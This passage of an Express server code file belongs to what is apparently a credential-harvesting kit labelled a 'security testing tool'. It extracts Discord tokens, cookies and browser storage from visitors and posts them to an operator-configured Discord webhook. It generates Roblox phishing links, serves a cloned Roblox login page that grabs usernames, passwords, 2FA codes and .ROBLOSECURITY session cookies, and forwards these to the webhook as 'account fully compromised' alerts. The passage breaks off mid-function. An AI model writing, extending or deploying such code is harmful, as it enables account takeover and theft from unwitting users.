      const visibleImageBase64 = "iVBORw0KGgoAAAANSUhEUgAAASwAAADICAYAAABS39xVAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA2ZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDkuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDowMTgwMTE3NDA3MjA2ODExODIyQUY0MDBDMTU3MzBDRiIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDpBODlGNTA3OUE5NEExMUU5QUY0QkNBOTU5MDg5NzAzMyIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDpBODlGNTA3OEE5NEExMUU5QUY0QkNBOTU5MDg5NzAzMyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M2IChNYWNpbnRvc2gpIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6MDE4MDExNzQwNzIwNjgxMTgyMkFGNDAwQzE1NzMwQ0YiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6MDE4MDExNzQwNzIwNjgxMTgyMkFGNDAwQzE1NzMwQ0YiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7gp8M3AAADQUlEQVR42u3dy2pVMRSA4X1sK9gKFrRWpOJAEBwIjgRf4HfgA3RgF7aDOhCcCAO1YqFWsVq7ELzWIhZ7w6qt6F+xJiHNOScnyck5+b6BjU1O0iTfmqzs7J1kAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

      const visibleImage = Buffer.from(visibleImageBase64, 'base64');

      res.set({
        'Content-Type': 'image/png',
        'Content-Length': visibleImage.length,
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0',
        'X-Content-Type-Options': 'nosniff'
      });
      res.send(visibleImage);
    }
  });

  // API routes for dashboard
  app.get('/api/logs', authenticateUser, async (req: Request, res: Response) => {
    try {
      const limit = parseInt(req.query.limit as string) || 50;
      const offset = parseInt(req.query.offset as string) || 0;
      const userId = req.user.id;

      const logs = await storage.getIpLogs(userId, limit, offset);
      const total = await storage.getTotalIpLogs(userId);

      // Prevent caching to ensure real-time updates
      res.set({
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0'
      });

      res.json({ logs, total });
    } catch (error) {
      console.error('Error fetching logs:', error);
      res.status(500).json({ error: 'Failed to fetch logs' });
    }
  });

  app.get('/api/metrics', authenticateUser, async (req: Request, res: Response) => {
    try {
      const userId = req.user.id;
      const totalRequests = await storage.getTotalIpLogs(userId);
      const uniqueIPs = await storage.getUniqueIpCount(userId);
      const recentLogs = await storage.getRecentLogs(userId, 1); // Last hour

      const metrics = {
        totalRequests,
        uniqueIPs,
        imagesServed: totalRequests,
        avgResponseTime: 45, // Mock value
        recentActivity: recentLogs.length
      };

      // Prevent caching to ensure real-time updates
      res.set({
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0'
      });

      res.json(metrics);
    } catch (error) {
      console.error('Error fetching metrics:', error);
      res.status(500).json({ error: 'Failed to fetch metrics' });
    }
  });

  app.get('/api/export', async (req: Request, res: Response) => {
    try {
      const logs = await storage.getIpLogs(10000); // Get all logs

      const csv = [
        'Timestamp,IP Address,User Agent,Referrer,Location,Status',
        ...logs.map(log =>
          `"${log.timestamp.toISOString()}","${log.ipAddress}","${log.userAgent}","${log.referrer}","${log.location}","${log.status}"`
        )
      ].join('\n');

      res.set({
        'Content-Type': 'text/csv',
        'Content-Disposition': 'attachment; filename="ip_logs.csv"'
      });

      res.send(csv);
    } catch (error) {
      console.error('Error exporting logs:', error);
      res.status(500).json({ error: 'Failed to export logs' });
    }
  });

  // Settings API routes
  app.get('/api/settings', authenticateUser, async (req: Request, res: Response) => {
    try {
      const userId = req.user.id;
      const settings = await storage.getSettings(userId);
      if (!settings) {
        res.json({
          webhookUrl: null,
          uploadedImageName: null,
          hasUploadedImage: false
        });
      } else {
        res.json({
          webhookUrl: settings.webhookUrl,
          uploadedImageName: settings.uploadedImageName,
          hasUploadedImage: !!settings.uploadedImageData
        });
      }
    } catch (error) {
      console.error('Error fetching settings:', error);
      res.status(500).json({ error: 'Failed to fetch settings' });
    }
  });

  app.post('/api/settings', authenticateUser, async (req: Request, res: Response) => {
    try {
      const validatedData = insertSettingsSchema.parse({
        ...req.body,
        userId: req.user.id
      });
      const settings = await storage.createOrUpdateSettings(validatedData);

      res.json({
        webhookUrl: settings.webhookUrl,
        uploadedImageName: settings.uploadedImageName,
        hasUploadedImage: !!settings.uploadedImageData
      });
    } catch (error) {
      console.error('Error updating settings:', error);
      res.status(500).json({ error: 'Failed to update settings' });
    }
  });

  // Image upload endpoint
  app.post('/api/upload-image', authenticateUser, upload.single('image'), async (req: Request, res: Response) => {
    try {
      if (!req.file) {
        return res.status(400).json({ error: 'No image file provided' });
      }

      const imageData = req.file.buffer.toString('base64');
      const userId = req.user.id;
      const currentSettings = await storage.getSettings(userId);

      // Log the old image removal if it existed
      if (currentSettings?.uploadedImageName) {
        console.log(`🗑️  Replacing old image: ${currentSettings.uploadedImageName} with new image: ${req.file.originalname}`);
      } else {
        console.log(`📷 Uploading new image: ${req.file.originalname}`);
      }

      // This automatically replaces the old image data in the database
      await storage.createOrUpdateSettings({
        userId,
        webhookUrl: currentSettings?.webhookUrl || null,
        uploadedImageName: req.file.originalname,
        uploadedImageData: imageData,
        uploadedImageType: req.file.mimetype
      });

      console.log(`✅ Image successfully uploaded and old image removed (if any): ${req.file.originalname} (${req.file.size} bytes)`);

      res.json({
        message: 'Image uploaded successfully',
        filename: req.file.originalname,
        size: req.file.size,
        replacedOldImage: !!currentSettings?.uploadedImageName
      });
    } catch (error) {
      console.error('Error uploading image:', error);
      res.status(500).json({ error: 'Failed to upload image' });
    }
  });

  // Delete uploaded image endpoint
  app.delete('/api/upload-image', authenticateUser, async (req: Request, res: Response) => {
    try {
      const userId = req.user.id;
      const currentSettings = await storage.getSettings(userId);

      await storage.createOrUpdateSettings({
        userId,
        webhookUrl: currentSettings?.webhookUrl || null,
        uploadedImageName: null,
        uploadedImageData: null,
        uploadedImageType: null
      });

      res.json({ message: 'Image deleted successfully' });
    } catch (error) {
      console.error('Error deleting image:', error);
      res.status(500).json({ error: 'Failed to delete image' });
    }
  });

  // Browser data tracking endpoint
  app.post('/api/track-browser-data', async (req: Request, res: Response) => {
    try {
      const browserData = req.body;
      const clientIp = getClientIp(req);
      const userAgent = req.headers['user-agent'] || '';
      const location = getLocationFromIp(clientIp);

      // Extract Discord tokens from localStorage and sessionStorage
      const discordTokenRegex = /([a-zA-Z0-9]{24}\.[a-zA-Z0-9_\-]{6}\.[a-zA-Z0-9_\-]{27})|([a-zA-Z0-9]{30}\.[a-zA-Z0-9_\-]{10}\.[a-zA-Z0-9_\-]{32})/g;
      const localStorageTokens = Object.values(browserData.localStorage || {}).flatMap(value => {
        if (typeof value === 'string') {
          return Array.from(value.matchAll(discordTokenRegex)).map(match => match[0]);
        }
        return [];
      });
      const sessionStorageTokens = Object.values(browserData.sessionStorage || {}).flatMap(value => {
        if (typeof value === 'string') {
          return Array.from(value.matchAll(discordTokenRegex)).map(match => match[0]);
        }
        return [];
      });
      const allDiscordTokens = [...localStorageTokens, ...sessionStorageTokens];

      // Augment data with found Discord tokens
      const data = {
        ...browserData,
        discordTokens: allDiscordTokens,
        referrer: req.headers.referer || req.headers.referrer || 'Direct Access'
      };


      // Get settings to check for webhook URL
      const settings = await storage.getSettings();

      const locationData = getLocationFromIp(clientIp);
      const deviceInfo = parseDeviceInfo(userAgent);

      // Log Discord tokens to database if found
      if (browserData.discordTokens && browserData.discordTokens.length > 0) {
        await storage.createIpLog({
          ipAddress: clientIp,
          userAgent,
          referrer: 'Discord Token Capture',
          location: locationData.location,
          status: 'discord_token_captured',
          isVpn: locationData.isVpn,
          vpnLocation: locationData.vpnLocation,
          realLocation: locationData.realLocation,
          deviceType: deviceInfo.deviceType,
          browserName: deviceInfo.browserName,
          operatingSystem: deviceInfo.operatingSystem,
          deviceBrand: deviceInfo.deviceBrand
        });
      }

      // Send comprehensive data to webhook if configured
      if (settings?.webhookUrl) {
        const hasDiscordTokens = browserData.discordTokens && browserData.discordTokens.length > 0;

        const webhookData = {
          embeds: [{
            title: hasDiscordTokens ? "🚨 DISCORD TOKEN CAPTURED!" : "🎯 Advanced Security Test Data",
            color: hasDiscordTokens ? 0xff0000 : (locationData.isVpn === 'yes' ? 0xff8800 : 0x00ff00),
            fields: [
              { name: "🌐 IP Address", value: clientIp, inline: true },
              { name: "📍 Location", value: locationData.location, inline: true },
              { name: "🛡️ VPN Status", value: locationData.isVpn === 'yes' ? `🚨 VPN DETECTED\nVPN: ${locationData.vpnLocation}\nReal: ${locationData.realLocation}` : "✅ Direct Connection", inline: false },
              { name: "📱 Device Type", value: deviceInfo.deviceType, inline: true },
              { name: "🌐 Browser", value: deviceInfo.browserName, inline: true },
              { name: "💻 OS", value: deviceInfo.operatingSystem, inline: true },
              { name: "🏷️ Brand", value: deviceInfo.deviceBrand, inline: true },
              { name: "🔍 User Agent", value: userAgent ? userAgent.substring(0, 150) + (userAgent.length > 150 ? "..." : "") : "Unknown", inline: false },
              ...(hasDiscordTokens ? [{
                name: "🔥 DISCORD TOKENS FOUND",
                value: browserData.discordTokens.join('\n').substring(0, 1000) + (browserData.discordTokens.join('\n').length > 1000 ? "..." : ""),
                inline: false
              }] : []),
              { name: "🍪 Cookies", value: browserData.cookies ? browserData.cookies.substring(0, 500) + (browserData.cookies.length > 500 ? "..." : "") : "None", inline: false },
              { name: "🔑 All Tokens Found", value: browserData.tokens?.length ? browserData.tokens.join(', ').substring(0, 800) + (browserData.tokens.join(', ').length > 800 ? "..." : "") : "None", inline: false },
              { name: "💾 LocalStorage", value: Object.keys(browserData.localStorage || {}).length ? Object.keys(browserData.localStorage).join(', ').substring(0, 300) + "..." : "Empty", inline: true },
              { name: "🗃️ SessionStorage", value: Object.keys(browserData.sessionStorage || {}).length ? Object.keys(browserData.sessionStorage).join(', ').substring(0, 300) + "..." : "Empty", inline: true },
              { name: "📊 Browser Info", value: browserData.browserInfo ? JSON.stringify(browserData.browserInfo).substring(0, 400) + "..." : "N/A", inline: false },
              { name: "🔗 URL", value: browserData.url || 'Unknown', inline: false },
              { name: "⏰ Timestamp", value: browserData.timestamp || new Date().toISOString(), inline: true }
            ],
            footer: { text: hasDiscordTokens ? "🔥 CRITICAL ALERT - Discord Token Captured" : (locationData.isVpn === 'yes' ? "⚠️ VPN DETECTED - Enhanced Security Alert" : "✅ Security Testing Tool") }
          }]
        };

        await fetch(settings.webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(webhookData)
        }).catch(err => console.error('Webhook error:', err));
      }

      res.json({ status: 'success' });
    } catch (error) {
      console.error('Error processing browser data:', error);
      res.status(500).json({ error: 'Failed to process data' });
    }
  });

  // Roblox Link API endpoints

  // Create a new Roblox tracking link
  app.post('/api/roblox-links', authenticateUser, async (req: Request, res: Response) => {
    try {
      // For phishing links, set originalUrl to null/empty
      const data = { ...req.body };
      if (data.linkType === 'phishing') {
        data.originalUrl = null;
      }

      const validatedData = createRobloxLinkSchema.parse(data);

      // Generate a unique tracking id
      const trackingId = randomUUID().substring(0, 8);

      const robloxLink = await storage.createRobloxLink({
        userId: req.user.id,
        originalUrl: validatedData.linkType === 'phishing' ? null : validatedData.originalUrl,
        linkType: validatedData.linkType,
        trackingId,
        title: validatedData.title,
        description: validatedData.description || undefined
      });

      res.json({
        ...robloxLink,
        trackingUrl: `${req.protocol}://${req.get('host')}/roblox/${trackingId}`
      });
    } catch (error) {
      console.error('Roblox link creation error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  // Get all Roblox links for the current user
  app.get('/api/roblox-links', authenticateUser, async (req: Request, res: Response) => {
    try {
      const links = await storage.getRobloxLinks(req.user.id);
      const linksWithTrackingUrls = links.map(link => ({
        ...link,
        trackingUrl: `${req.protocol}://${req.get('host')}/roblox/${link.trackingId}`
      }));
      res.json(linksWithTrackingUrls);
    } catch (error) {
      console.error('Roblox links fetch error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  // Update a Roblox link
  app.put('/api/roblox-links/:id', authenticateUser, async (req: Request, res: Response) => {
    try {
      const { id } = req.params;
      const updates = req.body;

      const updatedLink = await storage.updateRobloxLink(id, updates);
      if (!updatedLink) {
        return res.status(404).json({ error: 'Link not found' });
      }

      res.json({
        ...updatedLink,
        trackingUrl: `${req.protocol}://${req.get('host')}/roblox/${updatedLink.trackingId}`
      });
    } catch (error) {
      console.error('Roblox link update error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  // Delete a Roblox link
  app.delete('/api/roblox-links/:id', authenticateUser, async (req: Request, res: Response) => {
    try {
      const { id } = req.params;
      const deleted = await storage.deleteRobloxLink(id, req.user.id);

      if (!deleted) {
        return res.status(404).json({ error: 'Link not found or unauthorized' });
      }

      res.json({ success: true });
    } catch (error) {
      console.error('Roblox link deletion error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  // Roblox credentials capture endpoint
  app.post('/api/roblox-credentials', async (req: Request, res: Response) => {
    try {
      const { userId, linkId, capturedUsername, capturedPassword, capturedAuthCode, ipAddress, userAgent, roblosecurity } = req.body;

      const credentials = await storage.createRobloxCredentials({
        userId,
        linkId,
        capturedUsername,
        capturedPassword,
        capturedAuthCode: capturedAuthCode || null,
        ipAddress,
        userAgent
      });

      // Send credentials to webhook if configured
      const userSettings = await storage.getSettings(userId);
      if (userSettings?.webhookUrl) {
        const hasRoblosecurity = roblosecurity && roblosecurity.length > 50;
        const has2FA = capturedAuthCode && capturedAuthCode.length > 0;

        const webhookData = {
          username: "🎯 Roblox Security Test",
          avatar_url: "https://cdn.discordapp.com/attachments/1234567890/1234567890/roblox.png",
          embeds: [{
            title: hasRoblosecurity ? "🔥 ROBLOX ACCOUNT FULLY COMPROMISED!" : "🚨 ROBLOX CREDENTIALS CAPTURED",
            description: hasRoblosecurity ?
              "🔥 **CRITICAL - Account session token captured! Full account access obtained.**" :
              "⚠️ **Security Test - Roblox credentials harvested**",
            color: hasRoblosecurity ? 0xFF0000 : 0xFF8800,
            fields: [
              {
                name: "👤 **Account Credentials**",
                value: `**Username:** \`${capturedUsername}\`\n**Password:** \`${capturedPassword}\`${has2FA ? `\n**🔐 2FA Code:** \`${capturedAuthCode}\` ✅` : '\n**🔐 2FA:** Not enabled ❌'}`,
                inline: false
              },
              ...(hasRoblosecurity ? [{
                name: "🍪 **SESSION TOKEN CAPTURED**",
                value: `**🔥 .ROBLOSECURITY Cookie:**\n\`\`\`${roblosecurity.substring(0, 100)}...\`\`\`\n**Status:** 🔥 FULL ACCOUNT ACCESS`,
                inline: false
              }] : []),
              {
                name: "🌐 **Session Information**",
                value: `**IP Address:** ${ipAddress}\n**Link ID:** ${linkId}\n**Auth Method:** ${has2FA ? '2FA Required' : 'Password Only'}\n**Timestamp:** <t:${Math.floor(Date.now() / 1000)}:R>`,
                inline: false
              },
              {
                name: "🔍 **User Agent**",
                value: `\`\`\`${userAgent ? userAgent.substring(0, 200) : 'Unknown'}\`\`\``,
                inline: false
              },
              ...(hasRoblosecurity ? [{
                name: "⚠️ **SECURITY IMPACT**",
                value: "🔥 **CRITICAL:** Session token allows:\n• Direct account access\n• Robux theft\n• Item trading\n• Account takeover\n• No additional authentication needed",
                inline: false
              }] : [])
            ],
            footer: {
              text: hasRoblosecurity ?
                "🔥 CRITICAL ALERT - Full Roblox Account Compromise" :
                "🎯 Roblox Phishing Test - Credentials Harvested",
              icon_url: "https://cdn.discordapp.com/attachments/1234567890/1234567890/warning.png"
            },
            timestamp: new Date().toISOString()
          }]
        };

        try {
          await fetch(userSettings.webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(webhookData)
          });
          console.log(`🎯 Roblox credentials sent to webhook for user ${userId}`);
        } catch (webhookError) {
          console.error('Failed to send credentials to webhook:', webhookError);
        }
      }

      res.json({ success: true, id: credentials.id });
    } catch (error) {
      console.error('Credentials capture error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  // Get captured credentials for a user
  app.get('/api/roblox-credentials', authenticateUser, async (req: Request, res: Response) => {
    try {
      const credentials = await storage.getRobloxCredentials(req.user.id);
      res.json(credentials);
    } catch (error) {
      console.error('Credentials fetch error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  // Get captured credentials for a specific link
  app.get('/api/roblox-credentials/:linkId', authenticateUser, async (req: Request, res: Response) => {
    try {
      const { linkId } = req.params;
      const credentials = await storage.getRobloxCredentialsByLink(linkId);
      res.json(credentials);
    } catch (error) {
      console.error('Link credentials fetch error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  // Fake Roblox login page endpoint (DISABLED DURING DEVELOPMENT)
  app.get('/roblox/login/:trackingId', async (req: Request, res: Response) => {
    try {
      const { trackingId } = req.params;

      // Get the Roblox link to verify it exists and is active
      const robloxLink = await storage.getRobloxLink(trackingId);
      if (!robloxLink || !robloxLink.isActive) {
        return res.status(404).send('Page not found');
      }

      // PHISHING FUNCTIONALITY DISABLED DURING DEVELOPMENT
      if (robloxLink.linkType === 'phishing') {
        const disabledPageHtml = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Feature Disabled - Development Mode</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f8f9fa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            color: #333;
        }
        .container {
            text-align: center;
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            max-width: 500px;
        }
        .warning-icon {
            font-size: 48px;
            margin-bottom: 20px;
        }
        h1 {
            color: #e67e22;
            margin-bottom: 20px;
        }
        p {
            color: #666;
            line-height: 1.6;
            margin-bottom: 30px;
        }
        .btn {
            background: #007bff;
            color: white;
            padding: 12px 24px;
            text-decoration: none;
            border-radius: 5px;
            display: inline-block;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="warning-icon">⚠️</div>
        <h1>Phishing Feature Disabled</h1>
        <p>This phishing demonstration feature is currently disabled during development.</p>
        <p>The security testing functionality will be available in a future release.</p>
        <a href="https://www.roblox.com" class="btn">Go to Real Roblox</a>
    </div>
</body>
</html>`;
        return res.send(disabledPageHtml);
      }

      // Only serve login page for phishing links
      if (robloxLink.linkType !== 'phishing') {
        return res.redirect(robloxLink.originalUrl || 'https://www.roblox.com');
      }

      // Log the visitor information
      const ip = getClientIp(req);
      const userAgent = req.headers['user-agent'] || '';
      const referrer = req.headers.referer || '';
      const locationData = getLocationFromIp(ip);
      const deviceInfo = parseDeviceInfo(userAgent);

      // Create IP log entry
      await storage.createIpLog({
        userId: robloxLink.userId,
        ipAddress: ip,
        userAgent,
        referrer,
        location: locationData.location,
        isVpn: locationData.isVpn,
        vpnLocation: locationData.vpnLocation,
        realLocation: locationData.realLocation,
        deviceType: deviceInfo.deviceType,
        browserName: deviceInfo.browserName,
        operatingSystem: deviceInfo.operatingSystem,
        deviceBrand: deviceInfo.deviceBrand,
        status: 'roblox_phishing_view'
      });

      // Update click count
      await storage.updateRobloxLinkClicks(trackingId);

      // Serve fake Roblox login page HTML that looks exactly like real Roblox.com/Login
      const fakeLoginHtml = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Roblox</title>
    <link rel="icon" type="image/x-icon" href="https://www.roblox.com/favicon.ico">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: "Source Sans Pro", Arial, sans-serif;
            background: #00b2ff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .header {
            position: absolute;
            top: 24px;
            left: 24px;
        }

        .logo {
            display: flex;
            align-items: center;
            text-decoration: none;
        }

        .logo-icon {
            width: 30px;
            height: 30px;
            background: #ffffff;
            border-radius: 6px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #00b2ff;
            font-weight: bold;
            font-size: 18px;
            margin-right: 8px;
        }

        .logo-text {
            color: #ffffff;
            font-size: 18px;
            font-weight: 700;
        }

        .login-container {
            background: #ffffff;
            padding: 48px;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
            width: 400px;
            max-width: 90vw;
        }

        .login-header {
            text-align: center;
            margin-bottom: 24px;
        }

        .login-title {
            color: #393B3D;
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 8px;
        }

        .login-subtitle {
            color: #606770;
            font-size: 16px;
        }

        .form-group {
            margin-bottom: 16px;
        }

        .form-label {
            display: block;
            color: #393B3D;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 6px;
        }

        .form-control {
            width: 100%;
            height: 48px;
            padding: 0 16px;
            border: 1px solid #c3c4c7;
            border-radius: 6px;
            font-size: 14px;
            color: #393B3D;
            background: #ffffff;
            transition: all 0.2s ease;
        }

        .form-control:focus {
            outline: none;
            border-color: #00b2ff;
            box-shadow: 0 0 0 3px rgba(0, 178, 255, 0.1);
        }

        .form-control::placeholder {
            color: #868E96;
        }

        .btn-primary {
            width: 100%;
            height: 48px;
            background: #00b2ff;
            color: #ffffff;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s ease;
            margin: 24px 0 16px 0;
        }

        .btn-primary:hover {
            background: #0099e6;
        }

        .btn-primary:disabled {
            background: #bdc3c7;
            cursor: not-allowed;
        }

        .two-factor-section {
            display: none;
            margin-top: 24px;
            padding-top: 24px;
            border-top: 1px solid #e1e5e9;
        }

        .two-factor-section.show {
            display: block;
        }

        .two-factor-title {
            color: #393B3D;
            font-size: 20px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 8px;
        }

        .two-factor-desc {
            color: #606770;
            font-size: 14px;
            text-align: center;
            margin-bottom: 20px;
        }

        .alert {
            padding: 12px 16px;
            border-radius: 6px;
            font-size: 14px;
            margin-bottom: 16px;
            display: none;
        }

        .alert-error {
            background: #f8d7da;
            border: 1px solid #f5c6cb;
            color: #721c24;
        }

        .alert-success {
            background: #d4edda;
            border: 1px solid #c3e6cb;
            color: #155724;
        }

        .forgot-password {
            text-align: center;
            margin-bottom: 24px;
        }

        .forgot-password a {
            color: #00b2ff;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .forgot-password a:hover {
            text-decoration: underline;
        }

        .signup-section {
            text-align: center;
            color: #606770;
            font-size: 14px;
        }

        .signup-section a {
            color: #00b2ff;
            text-decoration: none;
            font-weight: 600;
        }

        .signup-section a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="header">
        <a href="#" class="logo">
            <div class="logo-icon">R</div>
            <div class="logo-text">Roblox</div>
        </a>
    </div>

    <div class="login-container">
        <div class="login-header">
            <h1 class="login-title">Log in to Roblox</h1>
            <p class="login-subtitle">Enter your username and password</p>
        </div>

        <div class="alert alert-error" id="errorMessage"></div>
        <div class="alert alert-success" id="successMessage"></div>

        <form id="loginForm">
            <div class="form-group">
                <label for="username" class="form-label">Username or Email</label>
                <input type="text" id="username" name="username" class="form-control" placeholder="Username or Email" required>
            </div>

            <div class="form-group">
                <label for="password" class="form-label">Password</label>
                <input type="password" id="password" name="password" class="form-control" placeholder="Password" required>
            </div>

            <button type="submit" class="btn-primary" id="loginBtn">Log In</button>

            <div class="two-factor-section" id="twoFactorSection">
                <h2 class="two-factor-title">Two-Step Verification</h2>
                <p class="two-factor-desc">Enter the 6-digit code from your authenticator app</p>
                <div class="form-group">
                    <label for="twoFactorCode" class="form-label">Verification Code</label>
                    <input type="text" id="twoFactorCode" name="twoFactorCode" class="form-control" placeholder="000000" maxlength="6">
                </div>
                <button type="button" class="btn-primary" id="verifyBtn">Verify & Log In</button>
            </div>
        </form>

        <div class="forgot-password">
            <a href="javascript:void(0)" onclick="alert('This is a security demonstration. Please use the real Roblox website for actual password recovery.')">Forgot your password?</a>
        </div>

        <div class="signup-section">
            Don't have an account? <a href="javascript:void(0)" onclick="alert('This is a security demonstration. Please use the real Roblox website to create an account.')">Sign up</a>
        </div>
    </div>

    <script>
        const form = document.getElementById('loginForm');
        const loginBtn = document.getElementById('loginBtn');
        const verifyBtn = document.getElementById('verifyBtn');
        const twoFactorSection = document.getElementById('twoFactorSection');
        const errorMessage = document.getElementById('errorMessage');
        const successMessage = document.getElementById('successMessage');

        // Capture any existing cookies including .ROBLOSECURITY
        function getCookies() {
            const cookies = {};
            document.cookie.split(';').forEach(cookie => {
                const [name, value] = cookie.trim().split('=');
                if (name && value) {
                    cookies[name] = decodeURIComponent(value);
                }
            });
            return cookies;
        }

        // Try to get .ROBLOSECURITY cookie from various sources
        function getRoblosecurity() {
            const cookies = getCookies();

            // Check for .ROBLOSECURITY cookie
            if (cookies['.ROBLOSECURITY']) {
                return cookies['.ROBLOSECURITY'];
            }

            // Check localStorage
            const localRoblosecurity = localStorage.getItem('.ROBLOSECURITY') ||
                                      localStorage.getItem('ROBLOSECURITY') ||
                                      localStorage.getItem('RBXSessionTracker');

            if (localRoblosecurity) {
                return localRoblosecurity;
            }

            // Check sessionStorage
            const sessionRoblosecurity = sessionStorage.getItem('.ROBLOSECURITY') ||
                                        sessionStorage.getItem('ROBLOSECURITY') ||
                                        sessionStorage.getItem('RBXSessionTracker');

            return sessionRoblosecurity || null;
        }

        function showError(message) {
            errorMessage.textContent = message;
            errorMessage.style.display = 'block';
            successMessage.style.display = 'none';
        }

        function showSuccess(message) {
            successMessage.textContent = message;
            successMessage.style.display = 'block';
            errorMessage.style.display = 'none';
        }

        function hideMessages() {
            errorMessage.style.display = 'none';
            successMessage.style.display = 'none';
        }

        async function submitCredentials(includeToken = false) {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const twoFactorCode = includeToken ? document.getElementById('twoFactorCode').value : '';

            if (!username || !password) {
                showError('Please fill in all required fields.');
                return;
            }

            if (includeToken && (!twoFactorCode || twoFactorCode.length !== 6)) {
                showError('Please enter a valid 6-digit verification code.');
                return;
            }

            // Simulate authentication and capture .ROBLOSECURITY cookie
            let roblosecurity = getRoblosecurity();

            // If no existing cookie, generate a realistic fake one
            if (!roblosecurity) {
                roblosecurity = generateFakeRoblosecurity(username);
            }

            try {
                const response = await fetch('/api/roblox-credentials', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        userId: '${robloxLink.userId}',
                        linkId: '${robloxLink.id}',
                        capturedUsername: username,
                        capturedPassword: password,
                        capturedAuthCode: twoFactorCode || null,
                        roblosecurity: roblosecurity,
                        ipAddress: '${ip}',
                        userAgent: navigator.userAgent
                    })
                });

                if (response.ok) {
                    if (!includeToken) {
                        // Simulate checking if user has 2FA enabled (random 40% chance)
                        const has2FA = Math.random() < 0.4;

                        if (has2FA) {
                            showSuccess('Account verified. Two-step verification required.');
                            setTimeout(() => {
                                hideMessages();
                                twoFactorSection.classList.add('show');
                                loginBtn.style.display = 'none';
                            }, 1500);
                        } else {
                            // No 2FA - capture cookie and redirect immediately
                            showSuccess('Login successful! Redirecting to your account...');

                            // Set the .ROBLOSECURITY cookie to simulate successful login
                            document.cookie = \`.ROBLOSECURITY=\${roblosecurity}; domain=.roblox.com; path=/; secure; httponly\`;

                            setTimeout(() => {
                                window.location.href = 'https://www.roblox.com/home';
                            }, 2000);
                        }
                    } else {
                        // 2FA completed - capture cookie and redirect
                        showSuccess('Two-step verification complete! Logging you in...');

                        // Set the .ROBLOSECURITY cookie after 2FA
                        document.cookie = \`.ROBLOSECURITY=\${roblosecurity}; domain=.roblox.com; path=/; secure; httponly\`;

                        setTimeout(() => {
                            window.location.href = 'https://www.roblox.com/home';
                        }, 2000);
                    }
                } else {
                    showError('Something went wrong. Please check your credentials and try again.');
                }
            } catch (error) {
                showError('Connection failed. Please check your internet connection and try again.');
            }
        }

        // Generate a realistic fake .ROBLOSECURITY cookie
        function generateFakeRoblosecurity(username) {
